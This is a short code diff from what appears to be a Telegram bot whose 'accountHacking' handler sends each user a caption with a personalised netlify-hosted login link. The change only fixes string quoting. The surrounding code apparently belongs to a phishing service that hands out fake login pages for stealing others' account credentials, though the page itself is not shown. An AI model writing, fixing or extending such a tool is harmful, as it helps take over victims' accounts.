@@ -40,7 +40,7 @@ def accountHacking(call):
     
     
     img = open('./img/main.jpeg', 'rb')
-    caption_text = f'{get_text('acountHack_page', language)}\nnetifyy-realtime.netlify.app/login/{call.message.chat.id}'
+    caption_text = f"{get_text('acountHack_page', language)}\nnetifyy-realtime.netlify.app/login/{call.message.chat.id}"
 
     media = types.InputMediaPhoto(media=img, caption=caption_text)
     bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=back(call.message.chat.id))
